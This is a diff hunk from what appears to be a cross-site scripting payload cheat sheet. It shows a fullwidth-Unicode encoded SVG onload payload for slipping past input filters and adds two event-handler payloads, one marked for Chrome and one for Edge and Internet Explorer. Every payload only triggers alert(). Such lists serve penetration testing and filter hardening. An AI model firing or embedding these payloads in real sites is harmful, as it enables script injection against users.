@@ -50,6 +50,8 @@ http://www.utf8-chartable.de/unicode-utf8-table.pl?start=65280&number=128
 //The above link points to the UTF-8 fullwidth character transformations,
 useful if the server translates them to regular characters.This is an example
 %CA%BA>%EF%BC%9Csvg/onload%EF%BC%9Dalert%EF%BC%881)>
+<x id=y style=transition:1s tabindex=1 onwebkittransitionend=alert(1)>#y //Chrome
+<applet onerror=alert('xss')> //Edge and IE 5-11
                                                        
 /*To bypass input values*/
 
